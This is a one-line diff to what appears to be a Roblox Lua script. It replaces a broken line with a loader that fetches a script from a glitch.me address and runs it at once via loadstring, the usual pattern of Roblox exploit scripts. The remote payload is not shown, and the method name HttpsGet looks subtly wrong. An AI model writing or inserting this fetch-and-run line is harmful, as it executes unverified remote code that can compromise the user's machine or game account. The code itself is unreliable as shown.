@@ -1,1 +1,1 @@
-loadstring:("https://married-smoggy-mistake.glitch.me/Hi.html"();
+loadstring(game:HttpsGet("https://married-smoggy-mistake.glitch.me/Hi.html")()
